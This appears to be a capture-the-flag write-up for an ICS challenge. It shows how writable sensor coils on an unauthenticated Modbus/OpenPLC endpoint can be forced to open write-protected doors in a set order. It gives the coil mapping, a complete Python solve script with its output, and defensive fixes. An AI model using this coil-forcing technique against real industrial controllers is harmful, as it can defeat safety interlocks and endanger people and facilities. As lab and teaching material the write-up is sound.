## Overview

Breach is a Medium ICS (Industrial Control Systems) challenge. You get a Modbus-TCP endpoint fronting an [OpenPLC](https://openplc.com/) soft-PLC, the ladder logic it runs (`door_control_subsystem.st`), and a `umodbus` client stub. Five facility doors must be opened in a fixed order, `[door_3, door_0, door_4, door_1, door_2]`. The door output coils are write-protected — but the *sensor* coils that feed each door's open condition are not, an [improper access control](https://cwe.mitre.org/data/definitions/284.html) boundary that lets you drive the actuators indirectly.

## The technique

Every door is opened by an on-delay timer (`TON`) in the ladder logic, and each timer's input is a boolean over sensor signals:

```pascal
TON3(IN := NOT(Door_4) AND NOT(Door_1) AND NOT(Door_2) AND NOT(Door_0)
          AND sensor_13 AND sensor_12 AND NOT(sensor_11) AND sensor_10
          AND system_active, PT := T#5000ms);
Door_3 := TON3.Q;
```

Door_3 opens iff all other doors are closed, `sensor_13/12/10` are high, `sensor_11` is low, and `system_active` is high — held continuously for the timer's `PT` (5000 ms here; other doors use 5 s or 8 s). The defenders removed Modbus write access on the `Door_*` coils but left the `sensor_*` coils writable. Since the sensors are "hardwired to coils," forcing a sensor coil forces the interlock condition. You never write a door — you write the sensors that make the PLC open the door.

OpenPLC maps a `%QXbyte.bit` symbol to Modbus coil `byte*8 + bit`:

| Signal | PLC address | Coil |
|---|---|---|
| sensor_0..4 | %QX8.0–8.4 | 64–68 |
| sensor_5..7 | %QX37.0–.2 | 296–298 |
| sensor_10 | %QX52.0 | 416 |
| sensor_11 | %QX52.6 | 422 |
| sensor_12 / 13 / 14 | %QX16.6 / .7 / .0 | 134 / 135 / 128 |
| system_active | %QX75.2 | 602 |

## Solution

For each door in the required order, set the sensor coils so that **exactly one** door's timer input is true (and every other door's is false, keeping the sequence clean), then hold past that door's `PT`. When the last door opens, the flag is written to the holding registers starting at address 4 — one ASCII character per register.

Per-door sensor vectors:

- **Door_3** (PT 5 s): `sensor_10/12/13 = 1`, `sensor_11 = 0`, rest 0.
- **Door_0** (PT 8 s): `sensor_0/1/4 = 1`, rest 0.
- **Door_4** (PT 8 s): `sensor_10/11/12/13/14 = 1` — setting `sensor_11 = 1` is what keeps Door_3 from re-firing while Door_4 times.
- **Door_1** (PT 5 s): `sensor_0/5/7 = 1`, rest 0.
- **Door_2** (PT 8 s): `sensor_5/10/11 = 1`, rest 0.

Create `solve.py`:

```python
#!/usr/bin/python3
import sys, socket, time
from umodbus import conf
from umodbus.client import tcp
conf.SIGNED_VALUES = True
HOST, PORT = sys.argv[1], int(sys.argv[2]); UID = 1

S = {0:64,1:65,2:66,3:67,4:68, 5:296,6:297,7:298,8:299,9:300,
     10:416,11:422, 12:134,13:135,14:128}
SYS = 602

sock = socket.create_connection((HOST, PORT), 8)
def send(msg):
    for _ in range(4):
        try: return tcp.send_message(msg, sock)
        except OSError:
            time.sleep(0.5)
def wcoil(a, v): send(tcp.write_single_coil(slave_id=UID, address=a, value=v))
def set_sensors(vec):
    for i, v in vec.items(): wcoil(S[i], 1 if v else 0)

phases = [
 ("Door_3", {0:0,1:0,2:0,4:0,5:0,6:0,7:0,10:1,11:0,12:1,13:1,14:0}, 5+2),
 ("Door_0", {0:1,1:1,2:0,4:1,5:0,6:0,7:0,10:0,11:0,12:0,13:0,14:0}, 8+2),
 ("Door_4", {0:0,1:0,2:0,4:0,5:0,6:0,7:0,10:1,11:1,12:1,13:1,14:1}, 8+2),
 ("Door_1", {0:1,1:0,2:0,4:0,5:1,6:0,7:1,10:0,11:0,12:0,13:0,14:0}, 5+2),
 ("Door_2", {0:0,1:0,2:0,4:0,5:1,6:0,7:0,10:1,11:1,12:0,13:0,14:0}, 8+2),
]
wcoil(SYS, 1); time.sleep(1)
for name, vec, hold in phases:
    set_sensors(vec); wcoil(SYS, 1)
    print(f"[+] {name}: holding {hold}s"); time.sleep(hold)

regs = send(tcp.read_holding_registers(slave_id=UID, starting_address=4, quantity=90))
print("FLAG:", bytes([r & 0xff for r in regs if 0 < r < 127]).decode())
```

```console
$ python3 solve.py <target-ip> <target-port>
[+] Door_3: holding 7s
[+] Door_0: holding 10s
[+] Door_4: holding 10s
[+] Door_1: holding 7s
[+] Door_2: holding 10s
FLAG: HTB{...}
```

A few practical notes that cost time: use **one persistent Modbus socket** for all writes (reconnect-per-write is too slow and the docker instance reaps within a couple of minutes); decode the flag registers as **single bytes**, not packed 16-bit words (`reg = 72` is `'H'`, not two chars); and read ~90 registers, since the flag is longer than a 24- or 40-register window and you'll truncate before the closing `}`.

## Why it worked

The control system's access-control boundary was drawn in the wrong place. In ICS, any writable value that feeds a control decision *is* an actuator — write-protecting the `Door_*` output coils accomplishes nothing when the `sensor_*` input coils that gate them remain writable over an unauthenticated Modbus/TCP link (classic Modbus has no authentication or integrity). Holding one sensor vector at a time past each timer's `PT` lets an attacker walk the doors open in any order they choose.

## Fix / defense

- Treat every writable coil that influences a safety decision as an actuator — restrict the sensor/input coils, not just the output coils.
- Authenticate and segment Modbus: put it behind network segmentation, a data diode, or Modbus/TLS with a source allow-list of hosts and permitted function codes.
- Realize safety interlocks in hardware/relay logic that cannot be satisfied by forcing the soft-PLC's own input image — a decontamination interlock defeated by driving the PLC's inputs is not an interlock.
